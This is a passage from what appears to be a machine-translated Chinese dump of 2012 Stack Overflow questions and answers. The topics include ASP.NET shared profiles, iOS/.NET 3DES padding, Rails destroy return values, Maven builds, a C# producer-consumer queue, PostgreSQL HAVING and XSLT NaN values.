这似乎是一个已知的错误/问题，可能是由于缺乏围绕此功能的标准，因为逗号、'W'、'P' 都是特定的实现，可能会随着制造商为他们的标准拨号器而改变自己的。

[http://code.google.com/p/android/issues/detail?id=13684](http://code.google.com/p/android/issues/detail?id=13684)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:06:20.663

尝试使用逗号而不是 'p' 来表示停顿。我相信Android的暂停字符是一个逗号。

# web-services - 如何使用 Node.js 创建“传统”Web 服务

> ID：12646617
> 
> 赞同：0
> 
> 时间：2012-09-28T20:00:45.587
> 
> 标签：web-services, node.js

我希望有人能给我指出正确的方向。我想使用 Node.js 替换已定义合同的“旧版”Web 服务。我计划继续使用 Node.js 并过渡到更多 RESTful 调用，但我仍然需要支持旧版应用程序。这需要进行传统的 WS 调用。最好的方法是什么？......哪些模块是最好的选择？感谢您提供正确方向的任何指示。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T05:20:18.843

我所知道的为 SOAP / WSDL 提供至少一些支持的唯一模块是[node-soap](https://github.com/milewise/node-soap)。

它允许您编写 SOAP 客户端和 SOAP 服务器。也许这是一个起点。

# c# - 因此，当一个用户登录到我的应用程序时，所有当前用户都将成为该用户

> ID：12646620
> 
> 赞同：0
> 
> 时间：2012-09-28T20:00:53.600
> 
> 标签：c#, asp.net

我试图找出我的程序的哪一部分导致了这个错误。

我有多个页面都继承自`PageBase`. 他们从`PageBase`. 这是从以下位置获取用户名的函数`PageBase`：

```
uiProfile = ProfileManager.FindProfilesByUserName(CompanyHttpApplication.Current.Profile.UserName) 
```

在`CompanyHttpApplication`我有

```
 public static CompanyHttpApplication Current
    {
        get { return (CompanyHttpApplication)HttpContext.Current.ApplicationInstance; }
    } 
```

和

```
 public CompanyProfileInfo Profile
    {
        get
        {
            return profile ??
                   (profile =
                    ProfileManager.FindProfilesByUserName(ProfileAuthenticationOption.Authenticated,
                                                          User.Identity.Name).Cast
                        <CompanyProfileInfo>().ToList().First());
        }
        private set { profile = value; }
    } 
```

不幸的是，我没有编写这部分代码，并且编写它的程序员不再参与该项目。有没有人可以向我解释为什么当另一个用户登录时（当我使用应用程序时），我成为那个用户？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:03:03.337

HttpContext.Current.ApplicationInstance 是全局共享的。它不是每个用户。因此，您拥有一个共享配置文件，该配置文件会在新用户登录时立即覆盖您最初设置的任何内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T20:05:50.977

Application 实例在每个请求（应用程序级别）之间共享。

您需要 Session 级别——每个用户都有自己的实例。

使用[`HttpContext.Current.Session`](http://msdn.microsoft.com/en-us/library/system.web.httpcontext.session%28v=vs.80%29.aspx)而不是[ApplicationInstance](http://msdn.microsoft.com/en-US/library/system.web.httpcontext.applicationinstance%28v=vs.80%29.aspx)。

（下面的代码重命名了原始代码，并添加了一个属性，以便更清楚。根据需要随意调整。）

```
public static CompanyHttpApplication CurrentApplication
{
    // store application constants, active user counts, message of the day, and other things all users can see
    get { return (CompanyHttpApplication)HttpContext.Current.ApplicationInstance; }
}

public static Session CurrentSession
{
    // store information for a single user — each user gets their own instance and can *not* see other users' sessions
    get { return HttpContext.Current.Session; }
} 
```

# google-chrome - Chrome 22 开发者工具 - 环球资源搜索无法正常工作 (ctrl-shift-f)

> ID：12646621
> 
> 赞同：11
> 
> 时间：2012-09-28T20:00:57.313
> 
> 标签：google-chrome, search, google-chrome-devtools

今天早上我注意到我的 Chrome 更新到 Chrome 22 并且右上角的搜索已被删除，现在可以使用 ctrl-f 访问。

我还注意到 ctrl-shift-f 不再按预期工作......（但这不一致）

全局搜索为我节省了大量时间，现在有时在我至少查看一次脚本之前它不起作用。

例如，我有 5 个脚本，我知道它们都包含“fn_init”

我搜索 fn_init 并没有出现。

我打开其中一个脚本，然后再次按 ctrl-shift-f，最后只得到一个文件的匹配结果......

这是否按预期工作？我错过了一个选项还是什么？我的开发工具配置选项是：

**一般的**

*   禁用缓存

**来源**

*   显示已选中的文件夹
*   在内容脚本中搜索已选中

另外：如何安装旧版本的 Chrome 并阻止它自动更新？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-12T11:56:21.287

要获得旧版本的 Chrome，最好的办法是从[https://chromium-build.appspot.com/p/chromium/console](https://chromium-build.appspot.com/p/chromium/console)找到 Chromium 的构建版本，但是如果为了开发工具的稳定性，你会错过很多新功能和错误修复。

至于搜索所有文件，它仍然存在，Windows 上的 CTRL-SHIFT-F 和 Mac 上的 CMD-OPT-F。请参阅 Addy Osmani 的帖子[https://plus.google.com/115133653231679625609/posts/e4W2kdrFJY9](https://plus.google.com/115133653231679625609/posts/e4W2kdrFJY9)

如果您发现问题是错误，最好在[http://crbug.com/new](http://crbug.com/new)上提出问题，因为它会得到那里的工程团队的直接关注。

# objective-c - 在目标 c 中使用 CBC 模式进行 3DES 加密

> ID：12646622
> 
> 赞同：2
> 
> 时间：2012-09-28T20:00:58.017
> 
> 标签：objective-c, ios, xcode, encryption

我正在尝试在 iOS 上使用 3DES 和 CBC 模式加密来加密 NSString。

ASP.NET 上也使用了相同的加密方法，并且它们获得的加密字符串可与 Web 服务一起使用。`woodcraft554`从 .NET 代码中获取的加密字符串是： `9SWzd+rlvu/tK5UZoCXt8Q==`.

.NET 使用零填充进行加密。我正在使用的代码是：

```
+(NSString*)new3DESwithoperand:(NSString*)plaintext encryptOrDecrypt:(CCOperation)encryptorDecrypt key:(NSString*)key initVec:(NSString*)initVec
{     

NSData* data = [plaintext dataUsingEncoding:NSUTF8StringEncoding];
const void *vplainText = [data bytes];;
size_t plainTextBufferSize = [data length];
NSLog(@"%@, Length: %u",[data description],[data length]);

size_t bufferPtrSize = (plainTextBufferSize + kCCBlockSize3DES) & ~(kCCBlockSize3DES - 1);
NSLog(@"%zu, sizof of uint8_t: %zu",bufferPtrSize, sizeof(uint8_t));
size_t movedBytes = 0;
uint8_t *bufferPtr = malloc( bufferPtrSize * sizeof(uint8_t));
NSLog(@"%zu",sizeof(bufferPtr));
memset((void*)bufferPtr, 0x0, bufferPtrSize);
NSLog(@"%zu",sizeof(bufferPtr));
//    memset((void *)initVec, 0x0, (size_t) sizeof(initVec));
const void * vkey = [[NSString base64DataFromString:key] bytes];
const void *vinitVec = [[NSString base64DataFromString:initVec] bytes];
NSLog(@"vinitvec: %@",[[NSString base64DataFromString:initVec] description]);

CCCryptorStatus ccStatus;
ccStatus = CCCrypt(encryptorDecrypt,
                   kCCAlgorithm3DES,
                   kCCOptionPKCS7Padding & kCCModeCBC,
                   vkey,
                   kCCKeySize3DES,
                   vinitVec,
                   vplainText,
                   plainTextBufferSize,
                   (void*)bufferPtr,
                   bufferPtrSize,
                   &movedBytes);

NSData* result = [NSData dataWithBytes:(const void*)bufferPtr length:(NSUInteger)movedBytes];
NSString* str = [NSString base64StringFromData:result length:result.length];
NSLog(@"%@",str);

return str;
} 
```

我已经比较了`vplainText`,`vkey`以及`vinitVec`从 Objective-C 代码到 .NET 中的代码。他们是一样的。我得到的加密字符串是`9SWzd+rlvu8=`. 我相信这与填充有关。

这是他们正在使用的等效 .NET 代码：

```
protected string EncryptCreditCard(string creditCard)
{
    try
    {
        string ENCRYPTION_KEY = ConfigurationManager.AppSettings["ENCRYPTION_KEY"].ToString();
        string ENCRYPTION_IV = ConfigurationManager.AppSettings["ENCRYPTION_IV"].ToString();

        SymmetricAlgorithm sa = SymmetricAlgorithm.Create("TripleDES");
        sa.Key =   System.Convert.FromBase64String(ENCRYPTION_KEY);
        sa.IV =  System.Convert.FromBase64String(ENCRYPTION_IV);
        sa.Padding = PaddingMode.Zeros;

        byte[] inputByteArray = Encoding.ASCII.GetBytes(creditCard);
        MemoryStream mS = new MemoryStream();

        ICryptoTransform trans = sa.CreateEncryptor();
        byte[] buf = new byte[2048];
        CryptoStream cs = new CryptoStream(mS, trans, CryptoStreamMode.Write);
        cs.Write(inputByteArray, 0, inputByteArray.Length);
        cs.FlushFinalBlock();

        return Convert.ToBase64String(mS.ToArray());
    }
    catch
    {
        return "";
    }
} 
```

如何在 iOS 中获得正确的加密字符串？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T07:43:58.207

通过使用零填充。您的代码明确指出`kCCOptionPKCS7Padding`，这不是零填充。否则密文似乎相同。

请注意，最好`PaddingMode.PKCS7`在 .NET 代码中使用。它会在奇怪的情况下添加一些数据，即纯文本的大小已经是块大小的数倍，但它是标准化的，并且取消填充不再取决于纯文本值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-20T05:19:48.797

问题在于用于加密的“密钥”。iOS 使用 24Byte 密钥，而 Adnroid 和 .NET 使用 16Byte 密钥。

已针对同一问题发布了详细的解决方案，其中描述了密钥生成。[iOS产生不同加密值的解决方案](https://stackoverflow.com/questions/25480250/encryption-for-ios-3des-not-same-as-android-and-net/26400365#26400365)

# javascript - 计算由角度和长度表示的 3d 点云数据的 2d 位置

> ID：12646627
> 
> 赞同：0
> 
> 时间：2012-09-28T20:01:16.850
> 
> 标签：javascript, math, canvas, 3d, geometry

我正在尝试构建一个使用 Javascript 将以特定方式存储的点云数据呈现到画布的东西。

数据存储为（JSON，其中 -> 表示一系列值，包括两个极端值）

{"xangle":-Math.PI*2 -> Math.PI*2,"yangle": -Math.PI*2 -> Math.PI*2,"disntancefromorigin":10,"color":blue}

我在计算转动 xangle 的数学应该是什么时遇到了一些麻烦，xangle 表示线与 x 轴的角度和 yangle，它是相同的，但与 y 轴的距离，以及与原点的距离成“3d”点。

我一直在运行代码，该代码生成大量与原点距离相同且距离相同的点，并尝试手动蛮力算法直到我做对了——但这并没有太大帮助。

![这是一张可能会使它更清晰的图像](../Images/1f72d2b29029b1a7346fe554ddd46f80.png)

感谢您的帮助，如果我没有说清楚，或者您想查看代码，请询问。

编辑：我应该补充一下，我只是想要一个正交表示（至少在我能得到它之前）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:20:53.780

```
r = distancefromorigin
y=r*cos(yAngle)
x=r*cos(xAngle)
z=+-r*sqrt( 1-cos^2(yAngle) - cos^2(xAngle) ) 
```

编辑：最后一个方程来自`x^2 + y^2 + z^2 = r^2`

您不能说是否必须选择 + 或 - 因为您的问题定义不明确！

# ruby-on-rails - 使用 .destroy() 返回值检查 ActiveRecord 对象是否被销毁

> ID：12646637
> 
> 赞同：10
> 
> 时间：2012-09-28T20:02:01.837
> 
> 标签：ruby-on-rails, ruby, activerecord, ruby-on-rails-3.1, destroy

我正在维护某人的代码库，他们有这样的东西：

```
if @widget_part.destroy
  flash[:message] = "Error deleting widget part"
else
  flash[:message] = "Widget part destroyed successfully"
end 
```

返回什么`destroy`？这样测试可以吗？我问的原因是我试图使用

```
flash[:message] = "Error deleting widget part : #{@widget_part.errors.inspect}" 
```

并且没有错误消息，所以我很困惑。它给出了类似的东西

```
#<ActiveModel::Errors:0x00000103e118e8 @base=#<WidgetPart widget_id: 7, ..., 
  id: 67>, @messages={}> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:14:35.640

如果不确定，可以使用`destroyed?`方法。destroy 的返回值没有记录，但它只返回冻结的销毁对象（您无法更新它）。它不返回销毁操作的状态。

虽然通常销毁对象应该总是成功，但您可以监听[ActiveRecordError](http://api.rubyonrails.org/classes/ActiveRecord/ActiveRecordError.html)。例如，[乐观锁定](http://api.rubyonrails.org/classes/ActiveRecord/Locking/Optimistic.html)可以在记录销毁时引发 ActiveRecord::StaleObjectError。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-01-02T05:10:16.673

正如上面一些人提到的，它`destroy`不返回布尔值，而是返回一个冻结的对象。此外，它确实会更新您调用它的实例对象的状态。这是我编写控制器的方式：

```
@widget_part.destroy

if @widget_part.destroyed?
  flash[:success] = 'The part is destroyed'
else
  flash[:error] = 'Failed to destroy'
end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T20:15:43.307

根据[Ruby on Rails API 文档](http://api.rubyonrails.org/)，该`destroy`方法将返回您销毁的对象，但处于冻结状态。

当一个对象被冻结时，不应对该对象进行任何更改，因为它不能再被持久化。

您可以使用 . 检查对象是否被销毁`object.destroyed?`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-02-03T20:25:26.350

请注意，虽然在 OP 的情况下有效，但它仅在与or`#destroyed?`相同的模型实例上调用时才有效；它不会检查数据库以查看基础记录是否已通过其他实例删除。`#destroy``#delete`

```
item1 = Item.take
# => #<Item:0x00000001322ed3c0

item2 = Item.find(item1.id)
# => #<Item:0x00000001116b92b8

item1.destroy
# => #<Item:0x00000001322ed3c0

item1.destroyed?
# => true

item2.destroyed?
# => false

item2.reload
# => raises ActiveRecord::RecordNotFound 
```

如果您需要检查另一个进程是否从您下面删除了记录（例如，由另一个用户，或者在通过控制器操作删除记录的测试中），您需要调用`#exists?`模型类。

```
Item.exists?(item2.id)
# => false 
```

# java - 当我只想要一个时，Maven 正在生成 2 个 JAR

> ID：12646639
> 
> 赞同：0
> 
> 时间：2012-09-28T20:02:04.890
> 
> 标签：java, maven

这是我的“mvn package”命令的一些输出：

```
[INFO] --- maven-jar-plugin:2.3.1:jar (default-jar) @ my-project ---
[INFO] Building jar: /Users/sfrazer/projects/my-project/target/my-project-0.0.1.jar
[INFO] 
[INFO] --- maven-assembly-plugin:2.2-beta-5:single (jar-with-dependencies) @ my-project ---
[INFO] Building jar: /Users/sfrazer/projects/my-project/target/my-project-0.0.1-jar-with-dependencies.jar 
```

第二个罐子是我指定要构建的正确罐子，但我不知道为什么要创建第一个罐子。所以我有两个问题：

1) 为什么要创建第一个 JAR？

2）如何使第二个 JAR 以第一个 JAR 的方式命名？

pom.xml 很长，但这是构建第二个 JAR 的相关部分：

```
<plugin>
  <artifactId>maven-assembly-plugin</artifactId>
  <configuration>
    <archive>
      <manifest>
        <mainClass>my.package.App</mainClass>
      </manifest>
    </archive>
    <descriptorRefs>
      <descriptorRef>jar-with-dependencies</descriptorRef>
    </descriptorRefs>
  </configuration>
  <executions>
    <execution>
      <id>jar-with-dependencies</id>
      <phase>package</phase>
      <goals>
        <goal>single</goal>
      </goals>
    </execution>
  </executions>
</plugin> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:05:41.583

因为 jar-with-dependencies 执行被定义为额外执行，而不是替换常规 jar 目标，后者是常规包或安装运行的一部分。

有些人试图在[这个问题](https://stackoverflow.com/questions/5016467/only-create-executable-jar-with-dependencies-in-maven)中禁用它，但一般来说，当制作一个包含 maven 的所有依赖项的 jar 时，“普通 jar”只是与它一起打包/保持不变。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T20:05:53.443

`my-project-0.0.1.jar`被创建是因为`maven-jar-plugin:jar`自动绑定到`package`具有`jar`打包的项目的阶段。

禁用它是个坏主意，因为依赖于 的工件的其他项目`my-project`想要包含 just 的 JAR `my-project`，而不是包含所有依赖项的超级 jar。

# c# - 使用列表的消费者/生产者模式

> ID：12646643
> 
> 赞同：0
> 
> 时间：2012-09-28T20:02:17.910
> 
> 标签：c#, .net, concurrency, queue

我有一个带有一个消费者和一个生产者任务的 WinForms 应用程序。我的生产者任务定期连接到 Web 服务并检索指定数量的字符串，然后需要将这些字符串放入某种并发的固定大小的 FIFO 队列中。然后我的消费者任务处理这些字符串，然后作为 SMS 消息发送出去（每条消息一个字符串）。我的生产者任务调用的 SOAP 函数需要一个参数来指定我想要获取的字符串的数量。这个数字将由我队列中的可用空间决定。因此，如果我的最大队列大小为 100 个字符串，并且下次我的生产者轮询 Web 服务时队列中有 60 个字符串，我需要它来请求 40 个字符串，因为那是我当时可以放入队列的所有内容.

这是我用来表示我的固定大小 FIFO 队列的代码：

```
public class FixedSizeQueue<T>
{
    private readonly List<T> queue = new List<T>();
    private readonly object syncObj = new object();

    public int Size { get; private set; }

    public FixedSizeQueue(int size)
    {
        Size = size;
    }

    public void Enqueue(T obj)
    {
        lock (syncObj)
        {
            queue.Insert(0, obj);

            if (queue.Count > Size)
            {
                queue.RemoveRange(Size, queue.Count - Size);
            }
        }
    }

    public T[] Dequeue()
    {
        lock (syncObj)
        {
            var result = queue.ToArray();
            queue.Clear();
            return result;
        }
    }

    public T Peek()
    {
        lock (syncObj)
        {
            var result = queue[0];
            return result;
        }
    }

    public int GetCount()
    {
        lock (syncObj)
        {
            return queue.Count;
        }
    } 
```

我的生产者任务目前没有指定我需要从 Web 服务获得的字符串数量，但它似乎可以像获取队列中的当前项目计数（q.GetCount()）然后从我的最大队列大小。但是，即使 GetCount() 使用了锁，是否有可能一旦 GetCount() 退出，我的消费者任务就可以处理队列中的 10 个字符串，这意味着我永远无法真正保持队列 100%满的？

此外，我的消费者任务基本上需要先“窥视”队列中的第一个字符串，然后再尝试通过 SMS 消息发送它。如果无法发送消息，我需要将字符串保留在队列中的原始位置。我首先想到的是“偷看”队列中的第一个字符串，尝试在 SMS 消息中发送它，如果发送成功，*则将其从队列中删除。*这样，如果发送失败，字符串仍然在队列中的原始位置。这听起来合理吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:11:49.573

这是一个广泛的问题，因此确实没有明确的答案，但这是我的想法。

> 但是，即使 GetCount() 使用了锁，是否有可能一旦 GetCount() 退出，我的消费者任务就可以处理队列中的 10 个字符串，这意味着我永远无法真正保持队列 100%满的？

是的，除非您`syncObj`在整个查询期间锁定对 Web 服务的查询。但是生产者/消费者的重点是允许消费者在生产者获取更多物品的同时处理物品。你真的无能为力。在*某些*时候，队列不会 100% 满。如果它总是 100% 满，那将意味着消费者根本没有做任何事情。

> 这样，如果发送失败，字符串仍然在队列中的原始位置。这听起来合理吗？

也许，但是按照您的编码方式，`Dequeue()`操作会返回队列的整个状态并清除它。给定此接口，您唯一的选择是重新排队失败的项目以供以后处理，这是一种非常合理的技术。

我还会考虑为消费者添加一种方法来阻止自己，直到有要处理的项目。例如：

```
public T[] WaitForItemAndDequeue(TimeSpan timeout)
{
    lock (syncObj) {
        if (queue.Count == 0 && !Monitor.Wait(syncObj, timeout)) {
            return null; // Timeout expired
        }

        return Dequeue();
    }
}

public T[] WaitForItem()
{
    lock (syncObj) {
        while (queue.Count != 0) {
            Monitor.Wait(syncObj);
        }

        return Dequeue();
    }
} 
```

然后你必须在它操纵列表之后更改`Enqueue()`为 call （所以在方法的末尾，但在块内部）。`Monitor.Pulse(syncObj)``lock`

# javascript - 获取反向地理编码的返回值

> ID：12646647
> 
> 赞同：0
> 
> 时间：2012-09-28T20:02:29.277
> 
> 标签：javascript, google-maps

我正在遍历excel中的纬度和经度列表。这很好用，我想让我的 codeLatLng 函数在循环中调用它时返回街道地址。

注释代码是我在 codeLatLng() 中尝试执行的操作。我知道我每秒只能调用 10 次 google，我将如何设置我的循环来做到这一点？

谢谢！

```
 function codeLatLng(input) {
            var latlngStr = input.split(",", 2);
            var lat = parseFloat(latlngStr[0]);
            var lng = parseFloat(latlngStr[1]);
            var latlng = new google.maps.LatLng(lat, lng);
            geocoder.geocode({
                'latLng' : latlng
            }, function(results, status) {
                document.getElementById("test").innerHTML = results[0].formatted_address + "<br />";
                //return results[0].formatted_address;
            });
        }

        function initialize() {
            geocoder = new google.maps.Geocoder();              
        }   

        function showmethemoney(){  
            var lat, lng, latlng, loc;
            var Excel = new ActiveXObject("Excel.Application"); 
            Excel.Visible = false;
            Excel.Workbooks.Open($("#file").val()); 
            Excel.Active
            //Excel.ActiveSheet.UsedRange.Rows.Count
            $("#test").append("<b> " + Excel.ActiveSheet.UsedRange.Rows.Count + " rows in file</b><br/>");
            //10 for testing purposes. I will be going through the entire document
            for (var i=1; i <= 10; i++) {                   
                lat = Excel.ActiveSheet.Cells(i,17).Value;
                lng = Excel.ActiveSheet.Cells(i,18).Value;
                latlng = lat + "," + lng;
                //loc = codeLatLng(latlng);         
                $("#test").append(i + ") " + latlng + " " + loc + "<br/>");                                     
            };  
            Excel.Quit();
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:09:54.907

您需要提供一个回调方法。您提供的方法将使用两个参数调用：

*   [GeocoderResult](https://developers.google.com/maps/documentation/javascript/reference#GeocoderResult)对象的数组
*   [地理编码器](https://developers.google.com/maps/documentation/javascript/reference#GeocoderStatus)状态

在您的回调中，您可以根据需要处理从地理编码器返回的数据。

[请参阅此处的](https://developers.google.com/maps/documentation/javascript/reference#Geocoder)地理编码器文档

更详细地说，geocode 方法将对 google 服务进行 ajax 调用。这是异步的。在调用 geocode 方法时，函数的其余部分将继续执行。一旦服务响应，您的回调将被调用，结果和状态将通过参数传递。如果你想存储结果，你可以简单地将它添加到任何你可以在外部使用的容器中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:14:28.603

向 codeLatLng 提供一个回调，该回调将在成功时调用。修改后的代码。
在代码中添加了循环我正在使用 setTimeout 循环 10 个项目。

```
 function codeLatLng(input, i, cb) {
                var latlngStr = input.split(",", 2);
                var lat = parseFloat(latlngStr[0]);
                var lng = parseFloat(latlngStr[1]);
                var latlng = new google.maps.LatLng(lat, lng);
                geocoder.geocode({
                    'latLng' : latlng
                }, function(results, status) {
                    document.getElementById("test").innerHTML = results[0].formatted_address + "<br />";
                   cb( results[0].formatted_address, i, input);
                });
            }
    function showmethemoney(){  
 //your code 
           var i = 1;
           function repeat10(i, max){
                for ( ; i <= max; i++) {                   
                     lat = Excel.ActiveSheet.Cells(i,17).Value;
                    lng = Excel.ActiveSheet.Cells(i,18).Value;
                     latlng = lat + "," + lng;
                    codeLatLng(latlng, i, function (loc, i, latlng ){
                          $("#test").append(i + ") " + latlng + " " + loc + "<br/>");   
                     });         

               } 
             setTimeout(function(){
                  if(i >= maxexcelsize){ return };
                   repeat10(i, i+10);
              }, 100);
            } 
            repeat10(i, i+10);
            Excel.Quit();
        } 
```

# ruby - 在 PostgreSQL 中获取总和时，如何跳过包含 null（或 nil）值的行？

> ID：12646653
> 
> 赞同：1
> 
> 时间：2012-09-28T20:02:53.370
> 
> 标签：ruby, postgresql, sequel

我的数据集：

```
item_category,year,price
"Bacon",1910,0.255
"Bacon",1911,0.247
"Bacon",1912,0.244
"Bacon",1913,0.27
"Bread",1913,0.056
"Bread",1914,0.063
"Bread",1915,0.07
"Bread",1916,0.073 
```

到目前为止我的代码：

```
SELECT
    string_agg(DISTINCT item_category, ' and ' ORDER BY item_category) AS items,
        year,
        sum(avg_yr_value) AS price
FROM
    earnings_and_prices
WHERE
    (item_category = 'Bacon' OR item_category = 'Bread')
GROUP BY
    year
ORDER BY
    year 
```

我的输出（我使用 Ruby gem sequel，所以这是哈希格式）：

```
{:items=>"Bacon", :year=>1910, :price=>0.255}
{:items=>"Bacon", :year=>1911, :price=>0.247}
{:items=>"Bacon", :year=>1912, :price=>0.244}
{:items=>"Bacon and Bread", :year=>1913, :price=>0.326}
{:items=>"Bacon and Bread", :year=>1914, :price=>0.338}
{:items=>"Bacon and Bread", :year=>1915, :price=>0.339}
{:items=>"Bacon and Bread", :year=>1916, :price=>1.017} 
```

我只想要包含培根和面包价格的年份。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:08:12.447

将以下内容添加到您的查询中（在 之后`group by`但在 之前`order by`）：

```
 having count(distinct item_category) = 2 
```

这可确保仅包含具有两个不同 item_categories 的组。

# xml - 导致 NAN XSLT 的百分比

> ID：12646654
> 
> 赞同：0
> 
> 时间：2012-09-28T20:02:55.843
> 
> 标签：xml, xslt, xpath, xml-parsing, xslt-1.0

我正在尝试使用 XSLT 1.0 解析文档以插入数据库，并且我注意到一个问题，即任何时候我有一个 % 值，它将返回为“NaN”而不是实际值。我找不到解决此问题的任何地方

资源：

```
<?xml version='1.0'?>
<?xml-stylesheet type="text/xsl" href="NaNValues.xsl" ?>
<items>
    <item>10%</item> 
</items> 
```

模板：

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" >
<xsl:output omit-xml-declaration="no" method="xml" indent="yes" version="1.0"/>

<xsl:template match="items">
 <xsl:for-each select="item">
  <xsl:call-template name="IsNaN"/>
 </xsl:for-each>
</xsl:template>

<xsl:template name="IsNaN">
 <MyItem>
   <xsl:variable name="myItem" select="item" />
   <xsl:value-of select="$myItem"/>
 </MyItem>
</xsl:template>
</xsl:stylesheet> 
```

输出：

```
<MyItem>NaN</MyItem> 
```

我尝试了以下方法：

```
substring($myItem,1,2)
substring($myItem,1,3)
concat($myItem,'')
string($myItem) 
```

我的主要问题是应该如何处理我的输入文件中的百分比符号。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T21:52:41.497

我看不出这段代码如何产生 NaN。它不做任何算术运算，这就是 NaN 的来源。当我运行它时，它会产生这个：

```
<?xml version="1.0" encoding="UTF-8"?>
<MyItem/> 
```

请检查您是否正在运行您说您正在运行的代码，如果它确实给出了 NaN，请向我们提供您如何运行它的详细信息（例如，哪个处理器，以及如何调用）。

代码显然是胡说八道——模板 isNaN 以“item”元素作为上下文节点调用，它试图找到名为“item”的上下文节点的子节点，当然没有这样的子节点。但这不应该返回任何内容，而不是 NaN。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T22:01:41.747

NaN 永远不等于任何东西——甚至不等于它自己。因此，如果您有两个 NaN 值，它们将不相等。您可以通过对任何有效的 xml 文件运行这个小型 xslt 转换来检查这一点：

```
<xsl:template match="/">
      <xsl:value-of select="'3%' = '3%'"/>|<xsl:value-of select="number('3%') = number('3%')"/>
</xsl:template> 
```

结果是：

```
true|false 
```

number('3%') 试图将 '3%' 转换为无效的数字并导致 NaN。因此，在第二种情况下，NaN = NaN 有效，如您所见，这是错误的。

回到你的情况——这取决于你想用这个值做什么。如果您尝试在任何数学运算（加法、乘法等）中盲目使用它，xslt 处理器将尝试将您的值转换为数字（由于 % 字符而为 NaN），并且从此时起任何数学运算的结果将是 NaN（我们现在知道）不等于任何东西。如果您想将值视为字符串，并且由于某种原因首先转换为数字，那么您可以通过执行 string(item) 来显式转换它而不是您想要的字符串。最后，如果您只想检查该值是否是有效数字，您可以使用上面的技巧并执行以下操作：

```
<xsl:value-of select="number($item) = $item"/> 
```

如果该值不能转换为数字，则 number($item) 返回 NaN（正如我们所知，它不等于任何值）意味着该项目不是有效值。如果 $item 可以转换为数字，则 '=' 的另一侧将隐式转换为数字，并且两者应具有相同的值，从而返回 true

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-29T13:52:18.130

明显的问题是提供的代码使用当前节点调用此模板`item`：

```
<xsl:template name="IsNaN">
 <MyItem>
   <xsl:variable name="myItem" select="item" />
   <xsl:value-of select="$myItem"/>
 </MyItem>
</xsl:template> 
```

这会尝试输出当前节点的第一`item` **个子**节点的字符串值——但是在提供的 XML 文档中 an`item`本身没有`item`子节点。

当然，这并不能解释返回 NaN 的原因——任何兼容的 XSLT 处理器都必须生成空字符串。我相信您的实际代码与您向我们展示的代码不同，实际代码涉及算术运算。在这种情况下，表达式的求值尝试将空字符串转换为数字——结果为 NaN。

**只需像这样重写上面的模板**：

```
<xsl:template name="IsNaN">
 <MyItem>
    <xsl:value-of select="."/>
 </MyItem>
</xsl:template> 
```

# asp.net-web-api - 如何在不调用 setter 注入的情况下丰富 StructureMap 中的对象组合？

> ID：12646657
> 
> 赞同：4
> 
> 时间：2012-09-28T20:03:03.120
> 
> 标签：asp.net-web-api, structuremap

我正在尝试`IHttpControllerActivator`使用 StructureMap 构建接口的实现，以便我可以解决控制器的依赖关系，该依赖关系依赖于`HttpRequestMessage`MVC Web API 管道中正在处理的内容。

我的实现`Create`如下：

```
public IHttpController Create(
    HttpRequestMessage request,
    HttpControllerDescriptor controllerDescriptor,
    Type controllerType)
{
    return (IHttpController)this.Container
        .With(request)
        .With(controllerDescriptor)
        .GetInstance(controllerType);
} 
```

该`Container`属性是对在构造`IContainer`激活器时传递给激活器的 StructureMap 实例的引用。

我对控制器的注册使用反射来获取所有`ApiController`实现：

```
foreach(var controller in this.GetType().Assembly.GetTypes()
    .Where(type => typeof(ApiController).IsAssignableFrom(type)))
{
   this.For(controller).Use(controller);
} 
```

使用调试器，我检查了初始化控制器实例并传入它们的依赖项。但是，当在`ExecuteAsync`控制器上调用该方法时，会抛出异常：

> 无法重用“ApiController”实例。'ApiController' 必须为每个传入消息构建。检查您的自定义“IHttpControllerActivator”并确保它不会制造相同的实例。

经过一些挖掘和实验后，我发现这是由于在开始时执行的`ExecuteAsync`检查检查了 的`Request`属性`ApiController`以查看它是否已分配值。如果该属性具有非空值，则推断控制器已用于处理请求并中止操作。

除此之外，我验证了 StructureMap 在组成控制器时尝试使用其设置器注入行为，并负责`Request`具有非空值。

在我的注册表中，我没有配置任何 setter-injection，所以我对为什么在这里调用它感到困惑。围绕 StructureMap API 进行的探讨并没有产生任何关于如何改变所表现出的行为的明显答案。

我是否错误地调用了 StructureMap？有没有我可以利用的配置设置说“从不分配属性值”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T21:08:23.970

我认为您的问题围绕着您设置控制器的方式`StructureMap`。为了让它正常工作，最好的方法是通过创建自己的`IDependencyResolver`. [在http://craigsdevspace.wordpress.com/2012/02/26/using-structuremap-with-web-api/](http://craigsdevspace.wordpress.com/2012/02/26/using-structuremap-with-web-api/)有一个很好的例子

但是，基本代码可能类似于：

**IDependencyResolver**：

```
public class _DependencyResolver : _DependencyScope, IDependencyResolver {

    public _DependencyResolver(IContainer container) : base(container) { }

    public IDependencyScope BeginScope() {
        return new _DependencyScope(_container);
    }
} 
```

**IDependencyScope**：

```
public class _DependencyScope : ServiceLocatorImplBase, IDependencyScope {
